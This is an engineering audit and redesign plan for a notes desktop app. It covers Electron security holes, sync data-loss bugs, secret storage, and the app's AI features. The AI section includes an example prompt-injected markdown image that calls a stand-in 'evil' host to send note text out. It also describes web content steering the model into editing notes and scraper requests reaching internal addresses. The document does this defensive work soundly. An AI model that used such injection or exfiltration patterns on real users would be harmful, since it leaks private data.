# CogNotez Desktop — Audit & Redesign Plan

*2026-10-13 · audited at commit `ff7d2b0` (v4.0.3) · scope: `desktop/` only (Android is a separate pass)*

## 0. Verdict

The feature set is reasonable. The structure under it is not:

- The renderer has full Node access.
- There is no single owner of the data.
- Sync can silently lose data in at least five ways.
- There are no tests, so every fix so far was a patch on top of a patch.

**Recommendation: rebuild the desktop app, don't refactor it.** Keep the assets that are good (locales, colour tokens, feature list, the crypto envelope idea). Put a real backend in the main process, behind a sandboxed renderer.

While v5 is being built, ship a small **v4.1 hotfix release** that closes the data-loss and remote-code-execution holes (§10). Users are exposed today.

**How this audit was done.** Five read-only audits ran in parallel: security/main process, data and sync, renderer architecture, AI, and UI/CSS. I then re-read the highest-severity claims myself.

- Items marked **✔** were re-verified by reading the code.
- All other items carry file:line citations from the auditors. Confirm them when you fix them.

---

## 1. By the numbers

| Metric | Value |
|---|---|
| JS (renderer + main) | **27.6k LOC**: `app.js` 5,632 · `main.js` 2,396 · `ai.js` 2,318 · `google-drive-sync.js` 2,301 |
| CSS | **6.5k LOC** in 12 files: 96 selectors defined in more than one file, 24 `!important`, 18 distinct z-index values |
| Tests / lint | **0 / 0**. CI runs `npm run lint \|\| echo` and no lint script exists. `test-searxng.js` is referenced but missing. |
| `console.*` calls | **959** (app.js 192, main.js 163, google-drive-sync.js 157, ai.js 140) |
| Inline `t()` re-definitions | **231**, shadowing the real one in `shared.js:11` |
| Duplicate class methods (later copy wins) | 4 in `app.js` ✔: `renderNotesList` 1706/1833, `setupExternalLinkHandling` 809/3621, `rewriteSelection` 2671/4384, `extractKeyPoints` 2684/4432 |
| Modal builders / notification systems / `escapeHtml` copies | 5+ / 2 / 5 |
| UI styling from JS | 319 inline `style="` strings and 209 `.style.` writes |
| IPC channels | 36, with no sender validation and 3 error conventions |
| Dependencies | Electron 30 is end-of-life. `npm audit`: 14 vulnerabilities (2 critical, 6 high). 7 direct deps unused (`express`, `uuid`, `html2canvas`, `jspdf`, `tailwindcss`, `postcss`, `autoprefixer`). |
| Persisted copies of the DB | **2**: renderer localStorage and main `cognotez_data.json`. The sync result is a third, applied by full replace. |
| Locales | 5 languages, 831 keys, **full parity**. This is the best-maintained part of the codebase. |

---

## 2. Critical findings

| # | Area | Finding | Where |
|---|---|---|---|
| C1 | Security | **Any XSS gives full control of the machine.** Problems in the renderer: <ul><li>`nodeIntegration: true`, `contextIsolation: false`, no sandbox, preload or CSP ✔</li><li>the only sanitizer is a hand-rolled blocklist with known gaps</li><li>titles, attachment names and toast messages go into `innerHTML` unescaped</li><li>input comes from untrusted sources: synced or imported notes, AI output, scraped pages</li></ul> | main.js:84-86 · shared.js:39-76 · app.js:5441, 3588 · rich-media.js:660 |
| C2 | Sync | **A failed download overwrites the cloud copy.** Any non-encryption download error is swallowed. `remoteData` stays `null`, so the code takes the "first-time sync" branch and uploads local over remote ✔. Every other device's changes are lost. | google-drive-sync.js:644 → 668 |
| C3 | Sync | **Concurrent edits are silently dropped.** In the "both edited" branch the local note is kept and the remote edit is overwritten. The conflict is marked `resolved`. | google-drive-sync.js:1033, 1179 |
| C4 | Sync | **Edits made during a sync are wiped.** The renderer snapshots its data, waits seconds for the network, then replaces the whole DB (`this.data = importData`). Notes typed in that window disappear, and later saves silently no-op. | app.js:5057-5075 · database.js:1159 · main.js:1308 |
| C5 | Sync | **Media is deleted based on a stale mirror.** Orphan cleanup scans the *main-process* copy of the DB, which only refreshes during sync. An image pasted since then is judged orphaned and deleted locally and on Drive. | main.js:1892-2012 |

## 3. Findings by area

### 3.1 Security & main process

| Sev | Finding | Where | Fix (v5) |
|---|---|---|---|
| High | **Secrets are stored as plain text.** <ul><li>The sync passphrase is stored ✔ (database.js:674).</li><li>The OpenRouter key sits in the DB blob.</li><li>OAuth tokens and the client secret are in plain JSON files.</li><li>No `safeStorage` anywhere.</li></ul> | database.js:674 · ai.js:550 · userData/*.json | `safeStorage`. The renderer can write secrets but never read them. |
| High | **Every backup file contains the passphrase and API key.** `exportDataAsJSON`/`backup` spread `...this.data` ✔. | database.js:829, 871-897 | Export an explicit allowlist of fields. |
| High | **Arbitrary file write.** `save-downloaded-media-file` passes `path.join(mediaDir, fileId)` with no validation ✔, so `../` escapes the media folder. Other media handlers prefix-match IDs. | main.js:1872 · 777-840 · 402 | Content-addressed IDs, strict hex check, exact lookup. |
| High | **The PDF export window can read local files.** It loads unsanitized note HTML from `file://` with `webSecurity:false` and JS enabled. | main.js:640-650 · backend.js:367 | `webSecurity:true`, `javascript:false`, sanitized HTML. |
| Medium | **Navigation is not locked down.** `will-navigate` allows any `file://` page into the privileged window, and `shell.openExternal` accepts any scheme. | main.js:102-110 | Deny all in-app navigation. Only `http(s)` and `mailto` go to `openExternal`. |
| Medium | **Google sign-in has no `state` or PKCE.** The callback is accepted if the URL contains `code=` and `localhost`. Users must also create and import their own Google Cloud credentials. | main.js:1018-1100 | App-owned desktop OAuth client, loopback redirect + PKCE + `state`, `drive.file` scope. |
| Medium | **Restoring a backup can replace everything.** `importDataFromJSON` swaps the whole DB, including sync settings, encryption state and AI endpoints, after checking only that `notes` exists. | database.js:900-910 | Schema validation; merge only allowlisted fields. |
| Medium | **Electron and dependencies are out of date.** Electron 30 is EOL, `npm audit` reports 14 vulnerabilities, and builds have no code signing or notarization. `files: ["**/*"]` ships dev pages. | package.json | Current Electron, signing, a narrow `files` list. |

### 3.2 Data, storage & sync

**How it works today:**

- **Storage.** The whole DB is one object, written with a synchronous `JSON.stringify` on *every* mutation. One edit costs three full stringifies plus a whole-DB hash.
- **Write safety and limits.** Writes are not atomic. The localStorage quota is about 5M characters, and exceeding it is not handled.
- **Schema.** `metadata.version: '1.0'` and no migration code.
- **Sync format.** Sync uploads one Drive blob (`cognotez_sync_backup.json`).
- **Merging.** Last-write-wins on client wall-clock time, and deletes leave no tombstones.

| Sev | Finding | Where |
|---|---|---|
| High | **Deletes come back.** A note deleted on A reappears after B syncs. AI conversations, `note_tags` and pruned data only ever accumulate, so they come back too. | google-drive-sync.js:940-950, 1127, 1170 |
| High | **Encryption gets silently downgraded.** A device with E2EE off that enters the passphrase decrypts the cloud file, then uploads it back as plaintext. | google-drive-sync.js:281 · main.js:943-975 |
| High | **Quota overflow loses edits.** When the quota is exceeded, `setItem` throws *after* the in-memory object was changed. The UI shows "save failed" and the edit is gone on restart. | database.js:140-157 |
| High | **Duplicate cloud files.** `findRemoteFile` swallows list errors and returns null, so the next sync creates a second remote file. One of the two is then picked at random. | google-drive-sync.js:520-558 |
| High | **Main and renderer disagree.** Each holds its own `DatabaseManager`. Sync-before-close and auto-sync read the main copy, which is never updated. | main.js:170, 334, 456 · database.js:995 |
| Medium | **Conflict detection has holes.** <ul><li>The version check is get-then-update, not atomic.</li><li>Clock skew corrupts both last-write-wins and delete inference.</li><li>Change detection compares `JSON.stringify` output, so key order matters.</li><li>The checksum is 32-bit, and it differs between desktop and Android.</li></ul> | google-drive-sync.js:230-260, 1195-1250 |
| Medium | **Media sync breaks past 100 files.** `listMediaFiles` doesn't paginate, so files beyond the first 100 never sync. Drive queries interpolate unescaped names. Media is never encrypted. | google-drive-sync.js:1496-1507 |
| Medium | **Too much work per keystroke.** Each save re-renders the whole note list and runs `getAllNotes` 2–3 times. Search scans all content on every keystroke, with no index. | app.js:1560-1650 · event-listeners.js:127 |

**Data-loss scenarios.** Each of these was traced through the code; none was reproduced at runtime.

1. **Edit during sync.** Text typed while a sync is running is wiped by the full replace (C4).
2. **Delete on A, sync from B.** The note is resurrected.
3. **Offline edits on two devices.** Whichever device syncs last wins, and the other edit is silently lost (C3).
4. **Transient 5xx or parse error on download.** The cloud is overwritten with local data (C2).
5. **Paste an image, then sync.** The image is deleted locally and on Drive (C5).
6. **Quota exceeded.** Recent edits exist only in memory and vanish on restart.
7. **E2EE on one device.** Another device downgrades the cloud file to plaintext.

### 3.3 AI subsystem

- **Where it runs.** All AI calls run in the renderer, with the API key in localStorage.
- **Provider code.** Ollama (`/api/generate`, `/api/chat`) and OpenRouter each have their own code path. The OpenRouter URL is hardcoded in 7 places.
- **Dead streaming code.** About 250 lines of streaming implementation (ai.js:1187-1436) have **zero callers**.

| Sev | Finding | Where |
|---|---|---|
| High | **Untrusted web text can rewrite notes.** Web-search tools are attached to *every* OpenRouter call when SearXNG is on, including edit, summarize, tags and generate. | ai.js:969-1183 |
| High | **The scraper fetches internal addresses.** URLs chosen by the model only pass a `startsWith('http')` check, so localhost, LAN addresses and cloud metadata are reachable. Responses are not size-capped. `url.includes('wiki')` sends Wikipedia to the Fandom scraper. | scraper.js:44-71 · ai.js:679 |
| High | **Zero-click data leak.** The sanitizer allows remote `https` images in AI output. A prompt-injected `![](https://evil/?q=<note>)` sends note text out without any click. | shared.js (~58) |
| High | **AI-edit review can corrupt notes.** The "diff" compares lines by position, so one inserted line marks every following line as changed. Edits are applied at offsets captured when the dialog opened, with no check that the text or the note is unchanged. Switching notes or a sync while the dialog is open corrupts the note. | ai-edit-approval.js:41-46, 111-135, 340-392 |
| Medium | **Cancel mostly doesn't work.** It aborts only the first request; tool rounds and follow-ups keep running. Ctrl+Enter calls a stub that applies nothing. "Rewrite" bypasses the approval UI entirely. | ai.js:922+ · ai-edit-approval.js:582 · app.js:2856 |
| Medium | **Context is unmanaged.** The whole note is stuffed into every prompt. Ollama's `num_ctx` is never set, so long notes are silently truncated. Chat history is rebuilt by scraping the chat bubbles' DOM text. Every stored conversation row carries a full copy of the note. | app.js:1925-2012 |
| Medium | **Local AI is disabled when offline.** `navigator.onLine === false` disables Ollama, which runs locally. This contradicts the local-first pitch. | ai.js:336-340 |

### 3.4 Renderer architecture

- **No real module system.** Two module systems are mixed: `require()` in app.js and script globals elsewhere. Load order is fixed by `<script>` tag order.
- **One god object holds the state.** `window.cognotezApp` is the only state owner. Feature modules reach into it about 360 times, and about 180 of those go straight to `notesManager.db`.
- **The editor is a plain `<textarea>`.** Native undo is destroyed by direct `.value` writes and replaced by a 50-snapshot `HistoryManager`. That history is cleared on every note switch, so switching tabs loses undo.
- **Tabs are metadata only.** There is one shared editor, with no per-tab cursor, scroll or undo.
- **Find/replace is bolted on.** The textarea cannot highlight matches, so 904 LOC of find/replace exist to work around that.
- **Listeners and observers leak.** The context menu stacks a `{once:true}` handler on every open, so actions can run N times. Split preview creates a new `ResizeObserver`/`MutationObserver` every 300 ms. `startAutoSave` adds listeners again on every call.
- **Timing patches instead of awaited events.** About 40 `setTimeout` calls cover focus and race problems. At least 8 separate global Escape handlers exist.
- **Keyboard shortcuts are defined twice,** in the renderer and in the Electron menu. Ctrl+Z is claimed by both.
- **Mobile UI ships in a desktop app.** `initializeMobileUI`, PWA meta tags and touch optimisations ship even though the window minimum width is 800px.

### 3.5 UI / UX

- **The status line is fake.** **"DRAFT" and "SAVED" are hard-coded** in the HTML and nothing ever updates them ✔ (index.html:193, 247). The colophon can say SAVED while edits are unsaved. It is the clearest sign of style over function.
- **It breaks offline.** Fonts and icons load from CDNs (Google Fonts, Font Awesome). Offline, every icon disappears and the editorial type falls back to Georgia. It is also a privacy leak for a privacy-focused app.
- **Light-theme contrast fails.** Against the page background: `--text-tertiary` 3.57:1, `--text-muted` 2.64:1, `--link-color` 1.98:1, and `--border-color` 1.19:1, so panel edges are effectively invisible. The dark theme passes.
- **Text is too small.** 50 font-size declarations are 11px or smaller, mostly tracked uppercase serif.
- **Accessibility is close to absent:**
  - only 5 ARIA attributes in index.html
  - modals have no `role="dialog"` and no focus trap
  - note and folder rows are `div`s, so the list is not keyboard-reachable
  - 16 `outline: none` rules against 5 `:focus-visible` rules
  - native `alert()`/`confirm()` are still used
- **Core actions are hard to find:**
  - Settings are reachable *only* from the OS menu bar.
  - The editor's "…" overflow menu holds 13 items.
  - There are four AI surfaces: panel, dialog, approval view and model switcher.
  - The sidebar stacks 4 navigation layers.
  - Search exists twice: the filter box and an Advanced Search panel.
- **About 590 of `responsive.css`'s 779 lines can never apply** (mobile breakpoints under an 800px minimum window width).
- **Dead pages ship.** `rescue-note.html` and `verification.html` are shipped; the latter links a CSS file that doesn't exist.

---

## 4. Root causes

1. **No process boundary.** With Node in the renderer, every module can do everything (fs, network, crypto, DOM). Nothing forced a layered design.
2. **No single owner of the data.** Main, renderer and the sync result each hold a copy, and changes move by whole-blob replacement. Most of the data-loss bugs follow from this.
3. **No module system and no state model.** One god object, delegate stubs and globals. Code was added where it was easy to reach, not where it belonged.
4. **No tests and no lint.** ESLint's `no-dupe-class-members` alone would have caught 4 live bugs. Without tests, fixes became `// CRITICAL` patches and `setTimeout` workarounds.
5. **Design changes in the skin.** Two design passes restyled the surface (tokens, fonts, renames) without changing structure, state or interaction.

## 5. What to keep

- **Locales.** 5 languages, 831 keys, full parity. Prune the 179 unused keys when porting.
- **The colour token layer and identity.** 61 tokens that the CSS consistently uses, the warm paper palette (`#fbf9f4` / `#0c0b10`), and the lavender "N" wordmark. The light theme's contrast needs re-deriving.
- **The feature set.** Notes, tags, tabs, markdown with preview/split, locked notes, templates, export (md/txt/pdf/backup), Drive sync, and AI actions plus chat. The features are right; the implementations are not.
- **The crypto basics.** Per-note lock with AES-256-GCM, random IV and a verified auth tag, plus a versioned envelope. Fix the salt and the KDF (key derivation) handling.
- **Small pieces of logic.** The keyboard shortcut map, the Drive auth-error surfacing from 4.0.2, and the 10 default templates (move their content into `.md` files).

---

## 6. Target architecture (v5)

### 6.1 Principles

- **The main process is the backend.** It owns all data, files, crypto, network and secrets. The renderer is a sandboxed UI that holds a cache.
- **One source of truth.** SQLite in main. Writes are transactional per entity, never "replace the DB".
- **Never silently drop user data.** Any conflict produces both versions. Deletes are tombstones. Automatic garbage collection waits through a grace period.
- **Offline means offline.** No network calls at startup: no CDNs, no connectivity probes gating local features.
- **Every trust boundary gets validated.** IPC arguments, imported files, synced objects, AI output and scraped pages.
- **Less code.** The target is under half of today's 27.6k LOC with the same features. The editor engine and the platform's built-ins replace most hand-rolled code.

### 6.2 Shape

```
┌──────────────── Renderer — sandbox:true, contextIsolation:true, strict CSP ─────────────────┐
│ Svelte 5 UI · CodeMirror 6 (one EditorState per tab) · command palette · in-memory stores   │
└──────────────▲───────────────────────────────────────────────────────────────┬──────────────┘
               │ events: note.changed · sync.status · ai.chunk                  │ window.api.*
┌──────────────┴────────────── preload: contextBridge, typed, ~15 methods ──────▼──────────────┐
└──────────────▲───────────────────────────────────────────────────────────────┬──────────────┘
┌──────────────┴──────────────────── Main process = "the backend" ──────────────▼──────────────┐
│ ipc/     validate sender frame + args (one schema per channel)                               │
│ store/   SQLite: WAL, FTS5, PRAGMA user_version migrations ← single source of truth          │
│ media/   content-addressed files userData/media/<sha256> · cognotez-media://<sha256>         │
│ crypto/  note lock · sync keys · secrets via safeStorage                                     │
│ ai/      OpenAI-compatible client · SSE streaming · abort · prompts · research tools         │
│ sync/    pure engine + transports: GoogleDrive (now) · Folder/WebDAV (later, same layout)    │
│ export/  md · txt · pdf (printToPDF in a locked window) · backup                             │
└──────────────────────────────────────────────────────────────────────────────────────────────┘
```

**Why there is no separate server process or local HTTP API.** CogNotez is single-user and local-first, so a local server only adds attack surface. The unused `express` dependency suggests someone started down that path. If self-hosted sync is wanted later, it fits as a third *transport* (WebDAV/Nextcloud), not as a server you have to run.

### 6.3 Store (SQLite)

Use `node:sqlite`, which is built into Node and needs no native rebuild. **Check during the Phase 1 spike** that Electron's Node build ships it with FTS5. The fallback is `better-sqlite3`. Sync calls block the main thread, which is fine at notes-app scale; move to a `utilityProcess` only if profiling shows jank.

```sql
notes(id TEXT PRIMARY KEY, title TEXT, body TEXT, created_at INT, updated_at INT,
      deleted_at INT, pinned INT, archived INT, locked INT, cipher BLOB, rev TEXT)
tags(id TEXT PRIMARY KEY, name TEXT UNIQUE COLLATE NOCASE)      -- hierarchy via "work/projects"
note_tags(note_id, tag_id, PRIMARY KEY(note_id, tag_id))      -- the ONLY tag link (drop note.tags[])
media(hash TEXT PRIMARY KEY, mime TEXT, bytes INT, created_at INT)
note_media(note_id, hash, PRIMARY KEY(note_id, hash))          -- what media GC reads
ai_messages(id, note_id, thread_id, role, content, model, created_at)  -- no full-note copies
settings(key TEXT PRIMARY KEY, value TEXT)                      -- never secrets
sync_state(id TEXT PRIMARY KEY, base_rev TEXT, base_hash TEXT)  -- per-note sync baseline
notes_fts  -- FTS5 external-content table over title/body; locked notes excluded
```

Search becomes one FTS query with a small syntax: `tag:work before:2026-01-01 is:pinned`. That replaces the separate Advanced Search panel.

### 6.4 Bridge API (preload)

```ts
notes.list(query) · notes.get(id) · notes.save(patch) · notes.trash(id) · notes.restore(id)
tags.list() · tags.rename(id, name) · search(q)
media.import(filePath | bytes) → hash
ai.run(task, input, port) · ai.abort(reqId) · ai.models()
sync.now() · sync.status()        // + events
settings.get(key) · settings.set(key, value)
secrets.set(name, value)          // write-only: API keys never come back to the renderer
export.note(id, fmt) · export.backup() · import.file()
```

File paths always come from dialogs opened by main, never from the renderer.

### 6.5 Sync protocol v2

The target is any "dumb" file store: Drive today, a local folder or WebDAV later. The design has to work with **no atomic compare-and-swap**, because Drive doesn't offer one.

```
CogNotez/
  meta.json                                  {format: 2, enc: null | {kdf, salt, iter, wrappedKey, keyCheck}}
  objects/note.<id>.<rev>.<parentRev>.json[.enc]   immutable, one file per revision
  objects/media.<sha256>[.enc]
```

**Rules:**

1. **Create, never overwrite.** Concurrent writers produce two revision files, never a lost update. Rev = hybrid logical clock (`<ms>-<counter>-<deviceId>`). The parent is in the filename, so a directory listing alone builds the revision graph.
2. **Heads.** A head is a revision that no other revision names as its parent.
   - **One head:** fast-forward.
   - **Several heads, only metadata differs:** take each field from the newest revision (by clock).
   - **Several heads, body differs on both:** keep one as the note and create a **"Conflicted copy"** note, flagged in the UI. Edits are never dropped.
   - 3-way text merge can come later, if conflict copies prove annoying. It doesn't need to be byte-identical across platforms: whichever device merges publishes the result.
3. **Deletes are tombstone revisions.** If an edit comes after a delete, the note comes back and is flagged.
4. **A failed download aborts the sync.** Bootstrap happens only when `meta.json` is provably absent, checked with a successful list call. This fixes C2 by construction.
5. **Results are applied per note** as SQLite transactions, followed by `note.changed` events. There is no whole-DB replace (fixes C4).
6. **Sync is incremental** via the Drive `changes.list` page token. A full list happens only on bootstrap.
7. **Garbage collection is deliberate.**
   - Old revisions: delete those that are ancestors of every head and older than 30 days.
   - Media: collect only from local `note_media` with a grace period, never inside the sync that uploaded them (fixes C5).
8. **AI messages and settings are not synced by default.**
9. **Android must be able to implement this.** Write it as a short spec plus JSON golden fixtures (encrypt/decrypt, merge cases) that both platforms test against.

**Onboarding.** Ship an app-owned desktop OAuth client with only the `drive.file` scope, loopback redirect and PKCE. Users no longer create Google Cloud credentials, which is today's biggest setup hurdle. `drive.file` should only need Google's lighter brand verification; confirm when registering the client.

### 6.6 Crypto

- **Locked notes.**
  - Encryption: AES-256-GCM, with the key from PBKDF2-SHA256 (600k iterations, random salt per note), the note ID as additional authenticated data (AAD), and the async KDF so the UI doesn't freeze.
  - Plaintext of a locked note is **never** written to SQLite, the search index, AI context, undo history or exports.
  - Locked notes auto-lock after idle time. This replaces today's password cache, which keeps passwords forever.
- **Sync E2EE.**
  - Keys: a random 256-bit data key (DEK), wrapped by a key derived from the passphrase with a random salt stored in `meta.json`. The iteration count is clamped (100k–2M), so a tampered file can no longer freeze the app with a huge value.
  - Every object is encrypted with the DEK, with its filename as AAD.
  - **Encryption state lives in `meta.json`.** A device must refuse to upload plaintext when meta says encrypted. This ends the downgrade bug.
  - Changing the passphrase only re-wraps the DEK. The DEK is cached locally via `safeStorage`, so the passphrase is entered once per device.
  - Media is encrypted too.
- **Argon2id later.** The KDF ID in the envelope makes switching to Argon2id a non-breaking change once both platforms have native support. PBKDF2 is the choice that works everywhere today.
- **Linux keyring caveat.** Check `safeStorage.getSelectedStorageBackend()`. With no keyring it falls back to `basic_text`, i.e. no real protection. Warn the user instead of pretending.

### 6.7 AI layer

- **One client.** One `chat()` over `/v1/chat/completions` with SSE streaming, running in main. Providers become presets: Ollama `http://localhost:11434/v1`, LM Studio, llama.cpp, OpenRouter and custom. A small Ollama add-on handles `/api/tags` model listing and context size. This deletes the 7 duplicated fetches and about 800 LOC.
- **Streaming and cancel.** Responses stream to the renderer over a `MessagePort`. Each request gets an `AbortController` keyed by request ID, so Cancel works end to end.
- **All prompts in one file (`prompts.ts`).** Each task is `{system, user, temperature, tools: false}`. Prompts say "answer in the language of the note". A context budget windows the note around the selection and caps tool output.
- **Every selection action goes through one path.** That covers summarize, rewrite, translate, fix and custom instructions:
  1. The AI result is applied as a CodeMirror transaction.
  2. `@codemirror/merge`'s unified view shows accept/reject per chunk.
  3. The whole edit is one undo step.

  CodeMirror maps positions through changes, so stale offsets are impossible. This fixes the positional diff, the Rewrite path that bypasses review, and broken undo in one stroke.
- **Chat history.** A real `messages[]` stored in `ai_messages`, with one AI surface: the Companion drawer.
- **Research mode is opt-in, per message.**
  - It runs SearXNG search plus fetch in main.
  - Private, loopback and link-local addresses are blocked *after DNS resolution*.
  - Only URLs returned by the search can be fetched, with a size cap.
  - Fetched content is wrapped as untrusted data.
  - **Edit actions never get tools.**
- **Rendering.** One markdown renderer (`marked` + DOMPurify) used everywhere. Remote images in AI output are click-to-load.
- **Tag suggestions** come back as JSON and are applied as real tags after confirmation.

### 6.8 Renderer & editor

- **Stack.** TypeScript, Vite (`electron-vite`) and Svelte 5. ES modules only. Stores are caches of main's data, kept up to date by events.
- **Editor.** CodeMirror 6 with markdown, one `EditorState` per tab, so undo, cursor and scroll per tab come free. The built-in search panel replaces `find-replace.js` (904 LOC) and `history.js`. Preview is a debounced sanitized render in split or preview mode.
- **Note list.** A keyed, virtualized list. A save patches one row.
- **One of each primitive:**
  - a `<dialog>` modal, which gives native focus trapping and Escape handling
  - a toast with `role="status"`
  - a menu
  - a `t()` function
  - a levelled logger: zero `console.log` in shipped code
- **Guardrails from day one:** ESLint (including `no-dupe-class-members`), `tsc --noEmit`, and Vitest for `store/`, `sync/` and `crypto/` (the merge and crypto logic *must* be tested). Add one Playwright-Electron smoke test covering create → type → restart → note is still there.

### 6.9 UI / UX direction

**Recommended direction: a quiet, dense tool UI, with the editorial character moved into the note itself.**

- **Type.** UI chrome uses `system-ui`: native feel, zero bytes, no Inter. Note body text uses bundled Source Serif 4. Fraunces is kept for the wordmark and note titles only.
- **Sizes and states.** UI text is at least 13px, with no 10px tracked uppercase. Every status shown is real.
- **Palette.** Keep the paper palette and the lavender accent. Re-derive the light-theme text tiers to WCAG AA and add `--border-strong`. Offer light, dark and system themes.
- **Assets.** Bundle the fonts (woff2) and use an SVG sprite of the roughly 40 Lucide icons actually used. Zero network requests at startup.

```
┌ sidebar ───────────┬ tabs ─────────────────────────────────────┬ Companion (toggle) ┐
│ ⌕ Search      ⌘K   │ Note title                                 │ thread             │
│ All · Pinned       │ #work #ideas · edited 2 min ago            │                    │
│ ▸ Tags (tree)      │ ────────────────────────────────────────── │                    │
│ Trash              │ editor (CodeMirror)      Edit|Split|Preview│                    │
│ ── notes ───────── │                                            │                    │
│ (virtualized list) │                                            │ ☐ research mode    │
│                    ├────────────────────────────────────────────┤                    │
│                    │ Saved · Synced 1 min ago · 412 words       │                    │
└────────────────────┴────────────────────────────────────────────┴────────────────────┘
```

- **Command palette (Ctrl/⌘K)** covers notes, actions, settings and model switching. It replaces both overflow menus and makes every action discoverable and keyboard-reachable.
- **Settings move into the app** as one page with sections: General · Editor · AI · Sync & Security · About. This replaces 4 separate settings modals plus the OS-menu-only entry point.
- **One AI surface (the drawer)** plus the inline review in the editor.
- **Accessibility baseline:** roving tabindex on lists, a global `:focus-visible` ring, `<dialog>` semantics, `aria-live` toasts, and AA contrast in both themes.

The alternative, keeping a full editorial skin but making it functional, is listed in §11.

### 6.10 Cut list

| Cut | Why / replacement |
|---|---|
| Mobile/touch UI, roughly 690 LOC of responsive CSS and mobile JS, PWA meta tags | The window minimum width is 800px |
| `localStorage` fallback path (about 48 branches) | SQLite is the only store |
| `history.js`, `find-replace.js`, scroll-sync hacks | CodeMirror 6 |
| Dead AI code: streaming impls, `processBatch`, `getSuggestions`, forced search, fallback scraper, manual search fallback | Zero callers |
| Reddit and Fandom scrapers | One generic readable-text extractor |
| AI template generator, plus the 347- and 256-line template dialogs | Templates become plain `.md` files |
| Advanced Search panel | Query syntax in the palette and search box |
| Drop-cap toggle, LN/COL colophon | A real status bar |
| Google Drive share-link management (about 240 LOC plus handlers) | Off-mission for a privacy-first app; export covers sharing. **Confirm.** |
| `rescue-note.html`, `verification.html` | Dev leftovers |
| Deps: `express`, `uuid`, `html2canvas`, `jspdf`, `axios`, tailwind/postcss/autoprefixer; `googleapis` → `@googleapis/drive` | `crypto.randomUUID`, `fetch`, `printToPDF`, or simply unused |

---

## 7. Migration from v4

1. **Read the old data on first v5 launch.** Electron serves every `file://` page from one origin, so the v5 renderer can read `localStorage['cognotez_data']` directly and hand it to main once through `migrateV4(blob)`.
   - Fallbacks: `userData/cognotez_data.json`, then a v4 backup file the user picks.
   - **v4 data is never modified**, so rolling back means running v4.
2. **Map the data.** Notes → `notes`. Tags are de-duplicated by name. `note.tags[]` and `note_tags` collapse into `note_tags`.
3. **Re-encrypt locked notes on first unlock.** Locked notes keep their v4 ciphertext. A v4 decrypt routine stays only for this lazy upgrade, and the note is re-encrypted in the v5 format.
4. **Rename media to content addresses.** Hash each file, rename it to `<sha256>`, and rewrite the `cognotez-media://` references in note bodies.
5. **Move secrets.**
   - The OpenRouter key and Drive tokens move to `safeStorage`.
   - The stored plaintext passphrase is **dropped**; the user re-enters it once.
6. **AI conversations:** offer to import them or drop them.
7. **Drive:** v5 can *import* the v1 blob once, but writes only v2. Desktop ships first (decided 2026-10-13), so **desktop↔Android sync pauses** from the day desktop switches to v2 until the Android port lands.
   - If that gap hurts, add a one-way bridge: desktop also writes a read-only v1 snapshot that Android can open. It is about 100 LOC, and it gets deleted after the Android port.

## 8. Roadmap

| Phase | Deliverable | Exit criteria | Size |
|---|---|---|---|
| **0 — v4.1 hotfix** | §10 checklist on a `v4` branch | C2–C5 can't happen; XSS can't reach Node (CSP); backups contain no secrets | S |
| **1 — Foundation** | electron-vite + TS + Svelte skeleton; sandbox, preload, CSP; SQLite schema and migrations; `store/` service; v4 importer; lint, typecheck, Vitest and CI that actually fail | A real v4 profile imports losslessly (a fixture test); CI goes red on a lint error | M |
| **2 — Core notes** | CodeMirror 6 editor and tabs, sidebar and virtualized list, FTS search, tags, trash, templates, locked notes (new crypto), media, export/import, command palette, settings page, a11y baseline, bundled assets | Feature parity with v4 minus the cut list; zero network calls at startup; AA contrast | L |
| **3 — AI** | Provider client, streaming and abort, prompts module, Companion drawer, inline merge review, research mode with SSRF guards | Cancel stops generation within 1s; no tools on edit actions; injection fixture tests pass | M |
| **4 — Sync v2** | Spec and golden fixtures, engine, Drive transport, app-owned OAuth, E2EE v2. The Android port follows, built against the same fixtures | All 7 data-loss scenarios from §3.2 pass as automated tests | L |
| **5 — Ship** | Signing and notarization, auto-update channel, i18n port (prune unused keys), v4 → v5 upgrade path | A clean install and a v4 upgrade both work on Linux, Windows and macOS | M |

**Risk: rewriting tends to grow scope** (the second-system effect). The cut list and the parity checklist are the guard. If something isn't in v4 or on this page, it waits for v5.1.

## 9. Not covered

- The Android app: next pass.
- Runtime profiling, and runtime reproduction of the sync scenarios: they were traced from code.
- A line-by-line read of the sync-encryption path inside `google-drive-sync.js`.

## 10. Phase 0 — v4.1 hotfix checklist

Each item is small and aimed at the highest risk.

1. **Sync (C2):** in the download `catch` (google-drive-sync.js:644), rethrow or abort. Never fall through to the "first time sync" upload. ✔
2. **Sync (C3):** in the "both edited" branch (google-drive-sync.js:1033), save the remote version as a "Conflicted copy" note instead of dropping it.
3. **Sync (C4):** in the `sync-data-updated` handler (app.js:5057), skip the full replace if any local write happened after the sync snapshot. Re-sync instead.
4. **Sync (C5):** disable automatic orphan-media deletion (main.js:1892-2012).
5. **Sync:** when `findRemoteFile` fails to list (google-drive-sync.js:520-558), abort instead of returning null.
6. **Secrets:** allowlist the fields in `exportDataAsJSON` and `backup` and drop `encryption` and the API keys (database.js:829, 871-897). ✔
7. **Files:** validate `fileId` in `save-downloaded-media-file` (main.js:1872) ✔. Use exact-match lookups in `get-media-file-as-base64`, `copy-media-file-for-pdf` and the protocol handler (main.js:777-840, 402).
8. **XSS:**
   - Replace the `shared.js` sanitizer with DOMPurify, and route `backend.js:367` `markdownToHtml` through it.
   - Escape the unescaped sinks at app.js:5441, app.js:3588 and rich-media.js:660.
9. **CSP:** add `script-src 'self'` to index.html. This needs the inline script at index.html:12 moved out and the 4 inline `onclick` handlers removed. It blocks `onerror`-style XSS from reaching Node.
10. **Navigation:** in `will-navigate`, deny everything except the app's `index.html`. Allow only `http(s)` and `mailto` in `openExternal` (main.js:102-110).
11. **AI:**
    - No tools on edit, summarize, tags or generate (ai.js `processWithOpenRouter`).
    - Block remote images in AI output (shared.js).
    - Add a private-IP block and a size cap to the scraper (scraper.js:44-71).
12. **AI edit:** before applying (ai-edit-approval.js:340-392), check the note ID and that `value.slice(start, end) === original`. Abort with a message otherwise.
13. **Crypto:** clamp `envelope.iter` (encryption.js:94-103).
14. **PDF:** set `webSecurity: true` and `javascript: false` on the PDF window (main.js:640-650).
15. **Duplicate methods:** delete the shadowing copies in app.js (1833, 3621, 4384, 4432). Check each one: the legacy `renderNotesList` is a live bug, because it ignores filters.
16. **Build hygiene:**
    - Add a real `lint` script with `no-dupe-class-members`.
    - Remove the phantom `test-searxng` scripts and the unused deps.
    - Run `npm audit fix`.
    - Upgrade Electron if a manual smoke test passes; otherwise leave the upgrade to v5.

## 11. Decisions

**Decided 2026-10-13:**
